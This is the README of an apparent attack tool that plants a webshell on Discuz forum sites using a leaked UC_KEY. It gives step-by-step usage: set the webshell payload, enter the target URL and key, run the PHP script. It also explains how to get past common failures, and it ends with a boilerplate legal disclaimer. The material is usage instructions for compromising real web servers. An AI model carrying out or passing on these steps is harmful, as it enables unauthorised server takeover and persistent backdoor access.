#### Discuz 全自动 GetShell

本方法比写 config_ucenter.php 更加稳定，而且不易出错

#### 用法

打开 `dzhack.php`, 找到 

```
$webshell = '<?php phpinfo(); ?>';
 
list ($status, $data) = $dz->hack (
   'http://ubuntu64/dz/',
   'K856C548X2xaTcDdc248I1pc57gdq4vdL2SdH3ifGd4a0ec6UdcfX0B7m9Ubrcs4',
   ...
);
```

先把第一行 `$webshell` 的内容改了，不需要考虑编码问题，

然后修改 `hack` 函数的参数，第一个为 discuz 的起始路径，第二行为你找到的 UC_KEY

然后执行 `php dzhack.php`,

会在 `data/client.php` 下面生成一个 webshell,

#### 常见失败原因

1. 新版 Dz 防御了 XSS，所以没法 POST XML
2. 提示 Authentication Expired （DZ 拼错了），多试几次就好了，因为服务器时钟不一致导致的

#### Legal Disclaimer

Using this tool is legit but hacking may not be. The author does not take any responsibility for such activities.


这个工具是合法的，然而攻击他人服务器并不是合法的，作者对此不承担任何责任
